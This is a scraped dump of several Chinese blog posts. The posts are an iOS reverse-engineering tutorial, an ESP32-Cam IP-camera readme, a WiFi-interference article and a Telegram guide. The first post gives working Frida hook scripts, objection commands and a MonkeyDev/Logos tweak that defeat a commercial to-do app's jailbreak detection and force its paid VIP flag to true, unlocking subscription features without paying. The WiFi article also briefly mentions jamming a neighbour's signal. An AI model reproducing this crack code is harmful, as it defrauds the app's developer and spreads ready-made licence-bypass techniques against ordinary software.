","date":"2021-11-28","objectID":"/zh-cn/29/:1:0","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"0x01 背景 前段时间在一个老师那里看到一群考研人的打卡信息，该APP能够详细的记录和分析学习过程。 于是就下载试用了一下。但是免费版有许多的限制。如免费版的话仅可以添加2个”习惯”类代办， 使用背景图也是需要开通季度卡的（虽然并没什么用）。 手机上打开”季度卡”页面，由于手机经过了越狱，在开通的时候提示非常抱歉，由于Apple的安全策略，暂不支持越狱用户购买，可点击右上角获取帮助-其他问题联系我们解决。 虽然免费版不影响正常使用，但是本着学习的态度想查看一下其越狱检测的绕过，结果发现竟然可以白嫖使用VIP功能。 ","date":"2021-11-28","objectID":"/zh-cn/29/:2:0","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"0x02 逆向分析 IOS下逆向常规操作判断该APP是否加壳(加密)，有壳的话先进行砸壳，然后利用IDA或者Hopper对脱壳后的Mach-O文件进行分析。首先需要准备一下环境和工具。 ","date":"2021-11-28","objectID":"/zh-cn/29/:3:0","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"1.准备工作 手机设备：一台越狱的IOS手机，版本为12.4.1，安装了OpenSSH和Frida，Frida版本为14.1.3。 逆向分析工具：IDA或者Hopper。 开发工具：Xcode。 抓包工具：BurpSuite 或者Charles。 电脑上安装Frida版本为14.1.3。 由于是APPStore下载的APP，是经过了加壳的。接下来开始对该APP进行砸壳。 ","date":"2021-11-28","objectID":"/zh-cn/29/:3:1","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"2. 砸壳 砸壳的脚本有很多，如frida-ios-dump、dumpdecrypted、Clutch、yacd等，这里采用的工具是frida-ios-dump。 安装方法： git clone https://github.com/AloneMonkey/frida-ios-dump cd frida-ios-dump pip install -r requirements.txt --upgrade 安装完成所需的依赖后打开dump.py进行配置。 User = 'root' Password = 'alpine'#默认的密码 Host = 'localhost' Port = 2222 #根据自己的端口进行修改 KeyFileName = None 使用方法: python3 dump.py APP名字` 或者`python3 dump.py Bundle identifier 将手机与电脑连接，打开APP，执行frida-ps -Ua,查看APP名字和Identifier。 frida-ps -Ua PID Name Identifier ---- ------ -------------------- 7312 APP名字 com.xxxx.tomatodo 然后进行砸壳 iproxy 2222 22 python3 dump.py com.xxxx.tomatodo 也可以执行python3 dump.py APP名字进行砸壳 砸了壳后提取出TomatoTime可执行文件，扔到IDA或者Hopper里面分析。 ","date":"2021-11-28","objectID":"/zh-cn/29/:3:2","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"3.分析 根据关键文字进行搜索，这里搜索的是”越狱”。由于Mac上的IDA7.0搜不出来中文字符，所以可以使用Hopper搜索，找到函数位置后使用IDA打开。也可以全程使用Hopper进行分析。 使用hopper搜索”越狱”字符串 发现是在方法startPay:中 找到后可以继续使用Hopper进行分析，或者在IDA中分析，我在这里采用了IDA。 直接在函数中搜索-[SeasonCardController startPay:]。 发现是该APP判断是否越狱，是根据是否存在Cydia来进行判断的。当/Applications/Cydia.app文件存在时，则提示用户越狱。 绕过这种越狱检测的方法也很简单，直接进行Hook fileExistsAtPath:方法即可。当判断/Applications/Cydia.app文件存在时将返回值改为0，即可绕过这里的越狱判断。 ","date":"2021-11-28","objectID":"/zh-cn/29/:3:3","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"4. 越狱绕过 根据上面的分析，开始对-[NSFileManager fileExistsAtPath:]进行Hook。 代码如下： var jailbreakPaths = [\"/Applications/Cydia.app\"]; var isJailBreakChecked = false Interceptor.attach(ObjC.classes.NSFileManager[\"- fileExistsAtPath:\"].implementation, { onEnter: function (args) { isJailBreakChecked = false; this.path = new ObjC.Object(args[2]).toString(); // check if the looked up path is in the list of common_paths if (jailbreakPaths.indexOf(this.path) \u003e -1) { console.log(\"fileExistsAtPath: check for -\u003e \" + this.path); isJailBreakChecked = true; } }, onLeave: function (retval) { if (!isJailBreakChecked) { return; } console.log(\"change before:\"+retval); retval.replace(0);//当判断/Applications/Cydia.app文件存在时将返回值改为0 console.log(\"change after:\" + retval); } }); 执行方法： frida -U -l tomatodo-jailbreak-bypass.js -f com.xxxx.tomatodo --no-pause 此时再次打开APP，可以成功进入季度卡开通界面。 当然也可以使用objection进行绕过越狱检测。 使用方法 objection -g \"com.xxxx.tomatodo\" explore --startup-command \"ios jailbreak disable\" 也是可以成功绕过越狱检测的。 ","date":"2021-11-28","objectID":"/zh-cn/29/:3:4","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"5.Vip功能绕过 在-[SeasonCardController startPay:]方法中有第53行这样一个判断，根据意思应该是判断是否激活。 根据上面的代码，猜测+[CommonUtil isActive]的结果是判断是否开通了季度卡的依据。在这里使用frida-trace进行追踪，frida-trace 用于跟踪函数或者 Objective-C 方法的调用，-m 跟踪某个 Objective-C 方法。 使用方法： frida-trace -U -f com.xxxx.tomatodo -m \"+[CommonUtil isActive]\" 它会在当前目录下生成一个 __handlers__目录，然后在目录下生成一个 类名/方法名.js 文件，这里的文件名为/CommonUtil/isActive.js。当在调用该方法时，会输出以下信息，按 Ctrl-C 可以停止跟踪。 打开生成的js文件会看到有两个函数，onEnter 是进入该函数时会执行的代码，onLeave 是该函数执行完离开时会执行的代码。在这里直接修改返回值retval为1。其代码如下： { onEnter(log, args, state) { log(`+[CommonUtil isActive]`); }, onLeave(log, retval, state) { console.log(\"change before:\"+retval); retval.replace(1); console.log(\"change after:\"+retval); } } 再次执行 frida-trace，/CommonUtil/isActive.js 文件不会覆盖，会执行刚才添加好的代码，如下： 此时发现不仅可以使用季度卡背景 而且也可以可以添加多个习惯类代办 其实并不是，在测试的时候由于没有注意，添加了两个习惯和一个目标，导致认为通过hook +[CommonUtil isActive]方法可以解锁全部的VIP功能，一直到后来写插件的时候才发现该错误，在编写非越狱插件时有详细的分析。 所以通过hook方法 +[CommonUtil isActive]可以实现到VIP功能的使用。 但这些都是在越狱手机上使用的，如果想在非越狱手机上使用的话，就需要使用一些插件来运行在非越狱手机上。 ","date":"2021-11-28","objectID":"/zh-cn/29/:3:5","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"0x03 编写非越狱插件 编写插件采用了非越狱插件开发集成神器MonkeyDev，集成了theos+Tweaks+Reveal.framework +Cycript +class-dump+CaptainHook。 安装和卸载可以参考https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85 安装完成后新建MonkeyApp 输入项目名称 项目建立后将砸壳后的APP拖入到TargetApp目录下。 这里使用Logos进行Hook代码，HOOK 某个类里面的某个对象方法语法： %hook 类名 - (返回值)方法名:(id)arg1 .... { ... } %end 这里我们需要对CommonUtil 类的方法isActive进行HOOK，修改返回值，代码如图所示。 连接非越狱手机后使用⌘+R运行该项目，手机上会多出来一个名字一样的APP。理论上来讲该APP可以使用其VIP功能。 首次在新设备上运行，需要设置-通用-描述文件与设备管理中信任证书。 然而此时只能使用VIP的部分功能，可以使用会员背景，但是无法添加超过2个习惯和目标类代办。此时才发现在使用frida进行hook的时候，测试添加多个习惯类代办时添加了两个习惯，一个目标，因此给出了可以使用全部VIP功能的结论。 通过关键字定位到-[AddTodoController confirm]方法。 发现添加超过2个习惯和目标类代办需要判断GVUserDefaults的isActive是否为真。 而且查看+[CommonUtil isActive]方法，其返回结果也是获取的GVUserDefaultsisActive属性的值。 对+[GVUserDefaults standardUserDefaults]进行hook，修改其isActive属性。 代码如下： @interface GVUserDefaults : NSObject @property(nonatomic) _Bool isActive; @end %hook GVUserDefaults + (id)standardUserDefaults{ GVUserDefaults *gvUser = %orig(); NSLog(@\"GVUserDefaults isActive old----\u003e%d\",[gvUser isActive]); [gvUser setIsActive:true]; NSLog(@\"GVUserDefaults isActive new----\u003e%d\",[gvUser isActive]); return gvUser; } %end 执行结果 此时可以使用超过2个习惯和目标类以及使用全部的背景功能。 ","date":"2021-11-28","objectID":"/zh-cn/29/:4:0","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":["IOS","逆向"],"content":"0x04 总结 本文通过一个简单的APP逆向，实现了越狱绕过以及解锁VIP会员功能。简单的介绍了一下相关工具的使用。关于越狱绕过，该APP越狱检测的方法很简单，只是判断了文件是否存在。其他检测的方式有：可以尝试读取系统所有的应用名称列表，看有无权限获取；检测stat是否出自系统库等。更多检测方式可以参考iOS开发-安全相关-越狱检测 。 对于该APP使用体验来讲，免费版功能已经够用了，而且无广告，如果有需要的可以开通季度卡，解锁更多功能。 ","date":"2021-11-28","objectID":"/zh-cn/29/:5:0","tags":["IOS","逆向"],"title":"IOS逆向初探","uri":"/zh-cn/29/"},{"categories":[],"content":"代码地址:https://github.com/ITJoker233/Esp32-Cam_IP_Camera ","date":"2021-11-28","objectID":"/zh-cn/28-5/:0:0","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"📽 基于Esp32-Cam 的 IP-Camera ","date":"2021-11-28","objectID":"/zh-cn/28-5/:1:0","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"当前版本1.0.1 main_v1.0.0.py是不支持热更新的 main.py 是最新版本 main_dev.py 是测试版本 支持带摄像头的ESP32,摄像头型号为TY-OV2640-2.0,其他的请自行测试 ","date":"2021-11-28","objectID":"/zh-cn/28-5/:1:1","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"📍 特性 支持多客户端 支持stream流 支持snapshot 支持在线浏览 支持设置密钥获取 支持伪OTA更新(目前需要自己搭建热更新服务器,只需把要更新的main.py和config.json放在web目录下,并修改更新Url即可) ","date":"2021-11-28","objectID":"/zh-cn/28-5/:2:0","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"📜未来计划 对应的移动端 对应的服务端 根据时间开启闪光灯 录制功能 拍照功能 more ","date":"2021-11-28","objectID":"/zh-cn/28-5/:3:0","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"📌用法 ","date":"2021-11-28","objectID":"/zh-cn/28-5/:4:0","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"🛠配置环境 pip3 install esptool pip3 install adafruit-ampy ","date":"2021-11-28","objectID":"/zh-cn/28-5/:4:1","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"🔨擦除ESP32-CAM 假如为COM12,先擦除ESP32-CAM python3 -m esptool.py --chip esp32 --port COM12 erase_flash 🔧刷入固件 固件在bin目录下 cd bin python3 -m esptool.py --chip esp32 --port COM12 write_flash -z 0x1000 esp32cam-mirco_python_v1.11-665-gfb0141559-kaki5.bin ⚙配置config.json 将里面的wifi_ssid和wifi_password与自己的WiFi名和密码对应 若有安全需要,则修改apikey就行 不想热更新的话,则修改updateUrl为空就行 ","date":"2021-11-28","objectID":"/zh-cn/28-5/:4:2","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"🌍上传文件 ampy --port COM12 put main.py ampy --port COM12 put config.json ampy --port COM12 put boot.py ampy --port COM12 put uasyncio ampy --port COM12 put urequests.py ampy --port COM12 put WIFI ","date":"2021-11-28","objectID":"/zh-cn/28-5/:4:3","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"🚀运行 上传成功后,按下reset键,已知config.json中的apikey为esp32Camera 在浏览器打开(实时观看):http://esp32-cam的IP/webcam/esp32Camera (获取视频流):http://esp32-cam的IP/stream/esp32Camera (获取照片):http://esp32-cam的IP/snapshot/esp32Camera ","date":"2021-11-28","objectID":"/zh-cn/28-5/:4:4","tags":[],"title":"利用ESP32-Cam制作IP-Camera【microPython】","uri":"/zh-cn/28-5/"},{"categories":[],"content":"2021年如何阻止邻居的WiFi信号 您的WiFi连接有问题吗？如果它在你的家里被打乱了，这可能是由于各种因素。服务提供商可能需要修复故障，或者邻居的WiFi可能存在问题。 当您邻居的WiFi信号强烈时，您的WiFi信号将中断。当信号干扰严重时，您的WiFi信号会更弱，结果可能会延迟。对于那些在家工作或参加在线课程的人来说，这种情况可能会非常恼火和恼火。你不必再就此与邻居争论了，因为你可以很容易地阻止邻居的WiFi信号。因此，为了救您，我们有一篇关于如何阻止邻居的WiFi信号的帖子。 ","date":"2021-11-28","objectID":"/zh-cn/28-4/:0:0","tags":[],"title":"2021年如何阻止邻居的WiFi信号","uri":"/zh-cn/28-4/"},{"categories":[],"content":"如何阻止邻居的WiFi信号 ","date":"2021-11-28","objectID":"/zh-cn/28-4/:1:0","tags":[],"title":"2021年如何阻止邻居的WiFi信号","uri":"/zh-cn/28-4/"},{"categories":[],"content":"我如何判断我邻居的WiFi信号是否足够强大，足以造成干扰？ WiFi信号问题可以是多方面的。在假设邻居的WiFi干扰您的WiFi之前，请与您的服务提供商验证或尝试刷新路由器。如果除了邻居的WiFi经常出现在你的范围内外，一切似乎都正常，你应该把它视为潜在的破坏者。 虽然您和您的邻居可能拥有不同的服务提供商，但两个相互竞争的信号将造成干扰，特别是当它们相近和重叠时。通过分析其射频频谱在您的范围内传播时，您可以确定邻居互联网连接的强度。WiFi网络的名称可能表明它是在2.4GHz（千兆赫）还是5GHz运行。您还可以检查WiFi信号栏，并将其与个人网络的信号进行比较。 如果您的设备以较慢的2.4GHz频率运行，而您的邻居以更快的5GHz频段运行，则可能会出现信号干扰。 ","date":"2021-11-28","objectID":"/zh-cn/28-4/:1:1","tags":[],"title":"2021年如何阻止邻居的WiFi信号","uri":"/zh-cn/28-4/"},{"categories":[],"content":"阻止邻居Wifi信号的解决方案 将网络名称添加到设备的块列表中只会模糊网络名称，对信号没有影响。以下是阻止邻居WiFi信号的三种实用方法： **更改路由器在家的位置。 **将路由器从邻居的路由器移开是获得良好信号的最简单技术。将其从侧壁移至房屋中更中央的区域。如果您知道邻居的WiFi在哪里，选择位置会更容易。否则，您必须一次尝试一个位置，看看是否有任何变化。 这种移动路由器的方法仅适用于非拥堵区域。如果您居住在拥挤不堪的房屋或只有墙壁作为您与邻居之间隔板的公寓中，这种策略可能有效，也可能不奏效。然而，你确实有其他可能性。 **转移到另一个频率。 **有两个WiFi频率经常使用。2.4GHz频域更长但速度较慢，而5GHz频域更短但更快。出于三个原因，您应该切换到5GHz频段，以避免信号干扰。 首先，由于5GHz频率不如2.4GHz频率流行，因此在任何特定位置的竞争更有可能减少。其次，它的射程更短。即使您和您的邻居共享相同的5GHz频段，您也可以将路由器迁移到家中，以获得更强的信号。第三，它的信道数量超过2.4GHz范围。如果很多人使用相同的频率，您可以更改为用户较少的频道。 **获取领土设置 **您可以使用无线网状系统来确保连续的信号和互联网连接。您不会受到邻居WiFi信号干扰的影响，但您的邻居可能会受到您的领土配置的影响。 **更改频率的频道。 **每个WiFi频率都有自己的一组频道。2.4GHz频率包含11个信道，而5GHz频段包含23个信道（有时更高）。由于路由器的限制，频率转移并不总是可能的。在您投资新路由器之前，请尝试切换到其他频道。认为这一战略等同于改变广播电台。 要更改频道，您必须首先确定您所在地区最常使用的频道。有些应用程序和应用程序会为您分析数据。然而，您可以使用反复试验的方法。最常用的2.4GHz信道是1、6和11，而最常用的5GHz信道是36、40、44和48。应该指出，给定频率的信道不一定遵循逻辑模式。 登录您的WiFi网络以更改频道。在任何网页浏览器中输入路由器的IP地址，然后按“回车”。如果打开警告消息，只需单击“高级”，后跟“继续”。您的登录名和密码是必需的。登录后，导航到“无线设置”，然后选择“频道”下拉菜单。将频道从“自动”更改为首选频道，然后保存更改。 您可以随时检查您所在地区的信号速度。使用fast.com根据邻居的WiFi开/关状态确定速度。 **减少连接的设备数量 **如果您的网络遇到问题，您可以尝试在任何给定时刻限制连接到WiFi的设备数量。您还可以通过关闭设备上的WiFi和蓝牙来减少干扰，以提高互联网连接的效率。 ","date":"2021-11-28","objectID":"/zh-cn/28-4/:1:2","tags":[],"title":"2021年如何阻止邻居的WiFi信号","uri":"/zh-cn/28-4/"},{"categories":[],"content":"解决WiFi干扰的其他替代方案 跟你的邻居谈谈 出于对隐私的尊重，邻居们经常避免询问与WiFi有关的问题。对于最近搬迁的邻居来说，情况确实如此。然而，实施协作策略将增加您解决信号干扰问题的机会。你可能也给他们造成了同样的问题。您可以请求不太敏感的信息，如路由器位置、WiFi频率和WiFi通道。这些数据将帮助您对家庭网络进行必要的更改。如果你有不止一个邻居，你更有理由和邻居谈谈。信号干扰可能会更糟。 建造更厚的混凝土墙 这一战略有助于阻止来自其他来源的信号，但它需要为大楼花费资金。如果您要租房，您可能还需要获得房东的批准。 发送阻止信号来干扰邻居的WiFi 您可以使用一些明确设计的应用程序，通过发送块信号来干扰某人的WiFi信号。在一些国家，这被认为是非法的，你可能会因此被罚款。因此，很少有人利用这种策略来解决WiFi中断问题。因此，您屏蔽其WiFi的人最终会了解它。 开始使用以太网电缆 以太网连接不受任何形式的信号中断的影响。如果您需要做一些紧急任务，您可以轻松切换到以太网线。任何计算机商店都有适配器，可用于将笔记本电脑和手机连接到以太网。 结论 虽然您可以使用本文中的任意一项或多项技术，以避免阻塞并改善WiFi小工具的WiFi互联网连接。您还可以使用任何策略来防止WiFi中断和邻居WiFi的干扰。 只需在同一WiFi频率上从一个网络通道切换到另一个网络通道，就可以大幅改变无线强度。将设备通道更改为更快的网络，就像更改射频一样。大多数时候，您可能会对为什么遇到WiFi干扰和中断感到困惑。 减少WiFi连接设备的数量可以让您远离烦人的WiFi情况。此外，在不使用或不需要时，请尝试关闭蓝牙和WiFi。如果您成功使用以下任何或所有方式，您可以获得持续的WiFi信号。你不会再被邻居的家庭Wi-Fi网络打扰了。 ","date":"2021-11-28","objectID":"/zh-cn/28-4/:1:3","tags":[],"title":"2021年如何阻止邻居的WiFi信号","uri":"/zh-cn/28-4/"},{"categories":[],"content":"此文为加密收费内容添加我微信支付后可看: 关于日常应用那些不得不说的事儿(0) Telegram已经成为我打开次数最多的APP了，新闻资讯，娱乐搞怪，学习交流，聊天水群。可以说一个telegram就能替代我手机上面很多的应用了。但是软件本身在中国大陆是无法使用的，所以需要具备突破GFW封锁的能力。正是由于这个限制，所以身边很多的亲戚还是使用着微信（微信有多烂我已经不想吐槽了）。但是我还是打算写下一些telegram的使用技巧和简单介绍，以便将来自己身边的人有机会接触到telegram的时候能够快速入门了解。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:0:0","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"Telegram的介绍 先对telegram进行简单的介绍，因为这个软件真的很有“故事”也很有“个性”。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:0","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"诞生 Telegram在2013年由杜罗夫兄弟（Nikolai·Durov与Pavel·Durov）正式发布。杜罗夫兄弟同时也是俄罗斯最大的社交网络服务VKontakte的创始者。Telegram Messenger LLP是独立的非营利公司，设立在柏林（这只是对外的说法，公司总部在哪儿没有人知道），并且承诺与VKontakte毫无关系。Nikolai为这个工具设计了加密协议和架构，同时Pavel的数字堡垒公司提供资金与基础设施，这就是Telegram，除此之外，telegram将保持公司独立运营，不受其他任何第三方势力的影响。所以，Telegram是为了隐私和安全而生的，和一些工程和产品团队开发的通讯工具不一样，它是真正由数学家主导的项目，坚实可靠，由于采用基于 256 位对称 AES 加密、2048 位 RSA 加密和 Diffie– Hellman 安全密钥交换，因此官方承诺任何人声称自己可以拦截破译telegram消息的可以获取30万美元的奖励。 关于PavelDurov的个人传奇经历，可以观看这个视频。 不得不说他是一个很有个性和想法的计算机天才和企业家。telegram这款软件也有着他个人十分鲜明的个性和特点在上面。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:1","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"宗旨 1.提供一种适用于地球上任何地方的安全通信方式。 2.保护用户的私人对话免受窥探（如官员，雇主的伤害），保护用户的个人数据免受第三方（如营销人员，广告商的伤害）。 3.不对telegram上的内容进行审查，尊重用户的隐私和自由。 4.不接受任何广告商，任何政府机构的介入，也不接受其他公司的投资，只接受捐赠，盈利不是telegram的目标，保持公司的独立运营并且忠于自己的信仰。 5.不会使用用户数据来展示广告，只存储telegram需要作为安全且功能丰富的消息服务所需的数据。 6.用户的个人数据只属于自己，用户可以随时拿回自己的数据或者一键永久删除账户。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:2","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"下载 telegram官方网站：https://telegram.org/ 官方网站可以找到所有客户端的下载入口，下载客户端请前往官方网站。 PC客户端下载也可以前往GitHub（但是GitHub没有Android的APK文件） ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:3","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"web端入口 webk:界面美观，功能较为齐全，动画流畅，字体偏小偏粗。 webz:功能性上和webK差不多，字体较大。 原生web:功能性上缺失较多，不推荐使用。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:4","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"补充 官方网站需要突破GFW的封锁才能访问，但是GitHub一般可以正常访问。我个人极为不推荐使用第三方客户端，特别是因为汉化问题，很多人转向各种各样的第三方。这里再次说明，telegram不会向用户收取任何的费用，软件本身也不会有任何的广告，但凡是不符合条件的第三方都应该统统舍弃。这些承诺都在他们的用户条款里面白纸黑字的写着——telegram privacy ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:5","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"特点 telegram作为一款极为优秀的IM软件，本身有很多的过人之处，稍微列举几项。 1.软件本身免费开源，且没有任何广告;跨平台应用，用户可以在Android,IOS,Windows,MacOS,Linux，还有web端使用他，基本支持现在所有的操作系统平台。 2.软件里面的任何内容都将不会被审查，你有极大的自由言论空间。（所以上面也就成了一些罪犯的滋生的地方，比如著名的韩国N号房事件就是发生在上面）。 （2018年8月，Telegram修改隐私政策，如果执法调查单位能够证明特定用户的身份为恐怖分子，将配合法院要求提供该用户的IP、电话号码等资料。） 3.秘密聊天的内容全部都是以直接的端到端加密来传输。这代表只有你与秘密聊天的对方，才能读取到这些聊天消息 － 没有任何其他人可以破解它们，包含Telegram团队本身。 4.发出的消息支持无限期撤回，私密聊天支持自动删除聊天记录（GitHub有telegram desktop防撤回插件，但是Telegram Desktop 桌面版 v2.8.5 更新限制插件使用。） 5.聊天历史无缝同步到所有设备上，所有的聊天记录都保存在云端，不必保存在本地，用户也可以选择随时删除远端数据，导出数据以及直接一键永久删除账户。 6.拥有海量的表情贴纸，高清而富有趣味；支持自制表情包，并用 Emoji 调用。 7.有众多功能强大的机器人供用户管理群组和频道，也支持用户自建机器人。 8.文本输入支持Markdown语法，无限消息置顶，记忆聊天浏览记录，消息链接和外部链接内容预览，@消息的快速定位和快速回复指定消息。 9.telegram支持全局搜索聊天记录，群组和频道（中文检索稍微差一点儿，但是无关紧要）。 10.发出的消息是一个√，对方已经阅读的消息是两个√，给予用户清晰明确的反馈。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:6","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"注册使用 telegram的下载方式前面已经说过了，去指定地址下载即可，接下来是注册使用telegram。由于遭到GFW的封锁，我们在注册账号的时候需要准备好翻墙的工具（请自行准备，不多阐述）。接下来以telegram desktop为例。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:7","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"SOCKS5代理注册 打开翻墙工具之后，打开 Telegram Desktop 桌面版客户端的代理设置，新建代理，选择 SOCKS5，地址设置为 127.0.0.1 ，端口设置为 10808 。 如果代理显示connected，表示成功，可以开始注册及正常使用。 如果一直显示connecting，表明此代理可能有问题，请尝试更换其他代理。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:8","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"MTP代理注册 打开 Telegram Desktop 桌面客户端后，点击左下角转动的圆圈来配置代理。再点击 use custom proxy 来添加自定义代理。 选择 MRProto 代理方式，依次输入 Hostname（服务器地址）、Port（端口）和 Secret（密码），最后点击 Save 保存。 如果代理显示connected，表示成功，可以开始注册及正常使用。 如果一直显示connecting，表明此代理可能有问题，请尝试更换其他代理。 更多的客户端注册使用方法请前往——telegram教程全指南 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:9","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"注意事项 1.telegram必须用电话号码才能注册，但是大陆用户我建议使用google voice来注册telegram。原因不过以下两个方面： 86号码不能主动私聊他人（这都“归功”于数字货币圈曾经大量发送spam还有疯狂拉人进群，最终导致 Telegram 官方开始限制中国大陆+86手机号的私聊功能。）如果要解除私聊就要去寻找Spam Info Bot。 中国手机号码是实名制而google voice是一个虚拟号码，与用户本身没有过多的信息连结，有利于进一步保护自己的隐私安全。google voice更多的介绍和使用方法请前往——Google Voice简介及使用\u0026保号 2.telegram虽说是一个较为安全的IM软件，但是我们还是需要对其中的一些方面进行设置（以下是telegram desktop设置方法，其他客户端设置方法大同小异，如果不清楚的话就参考上面的telegram教程全指南。 在设置-隐私和安全中把电话号码进行隐藏，任何人拉你进群聊和频道选项关闭，隐藏自己的上线时间，阻止通过转发消息寻人，启用两步验证，创建一个云端密码，降低被盗号的风险。 在设置-隐私和安全中，将删除账户的时间改为一年。（telegram会将指定时间内没有一次上线的账户进行销毁，默认时长是6个月）。 在设置-高级-自动下载媒体文件中找到私聊会话，群组，频道，禁止自动下载私聊会话，群组，频道中的文件。（起码要禁止自动下载私聊会话的文件，因为telegram存在专门针对86号码进行发送病毒文件的机器人账号）。 最好设置一个用户名，这样别人可以在不知道你电话号码的情况下通过用户名找你。 3.若用户在 24 小时内访问超过 200 个群组或频道的链接（点击打开就算访问，不需要加入），就会被禁止访问24 小时。禁闭期间，无法通过链接访问新的群组或频道（点击链接一直转圈而无法访问）。 4.telegram只有私密会话才是端对端加密的（在群聊中和普通的私聊中是不加密的），所以请在群聊和私聊中保护好自己的个人隐私，特别是你发送的照片中包含了大量的元数据，别有用心的人可以通过EXIF编辑工具来轻易找到您的位置。 要在iPhone上启动秘密聊天，请点击“聊天”标签右上角的新消息图标，然后选择“新建秘密聊天”。 选择您要与其发起秘密聊天的联系人，然后在下一个屏幕上，它将显示您已邀请他们加入。 请注意，他们需要在您的联系人列表中才能与他们进行秘密聊天。 要在Android手机上启动秘密聊天，有两种方法可以解决。 对于第一种方法（下面是左侧的GIF），请点击三行的侧边栏菜单图标，然后点击“新建秘密聊天”，然后点击联系人姓名。 对于第二种方式（下面的GIF右边），点击“聊天”屏幕右下角的新消息图标，选择“新秘密聊天”，然后选择联系人的姓名。 无论哪种方式，在下一个屏幕上，它将显示您已邀请他们加入。 请注意，他们需要在您的联系人列表中才能与他们进行秘密聊天。 关于更多加密聊天的消息可以参考——Telegram怎样开启端到端加密（E2EE） 5.虽然说官方不会审查telegram中任何群组和频道的任何内容，但是你一旦被他人多次举报，账户就会受到使用限制，直至封号处理。所以，请不要随意私聊他人和发送垃圾消息。 6.telegram支持传输单个最大文件为2GB，下载和传输的速度取决于你的本地网络状况（或者说你的翻墙工具）。 7.telegram上每一个用户最多可以创建10个公开的频道或者群组，最多申请创建20个机器人，一个账号可以加入的频道和超级群组数量：包括你拥有的频道和群组在内，一共可以加入最多500个。 8.telegram无法避免别人私聊你，所以如果你不想理他的话，直接点击右上角的举报+拉黑。此外，telegram也没有添加好友这一说法，因为任何人都可以私聊你。 最近6月份的telegram更新，官方增加更多的限制说明，以便于用户了解，可以参考——已知的telegram限制，或者参考telegram info 9.强烈开启telegram账号的两步验证。 目前只能在移动端开启和修改密保邮箱等操作。例如在安卓手机上，你可以在setting-privacy and security-two step verificaation中开启，密码设置的复杂一些。如果你觉得自己记不住太多的复杂密码的话，那么你可以去看我之前的浏览器扩展推荐中的bitwarden。而且记得给二步验证之后添加密保邮箱，建议选择安全性比较高的。例如protonmail和tutanota 这样有利于保护你的账号的安全。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:10","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"telegram的功能详细介绍 telegram的功能十分丰富，等你真正接触体验一段时间的telegram之后就会发现自己已经情不自禁的爱上他。而且有人已经为此做过详细的讲解和功能介绍了，我就不再赘述。若有兴趣的话我推荐前往 1.Telegram 教程全指南 2.Telegram（电报）：新手指南、使用教程及频道推荐 3.聪聪Blog 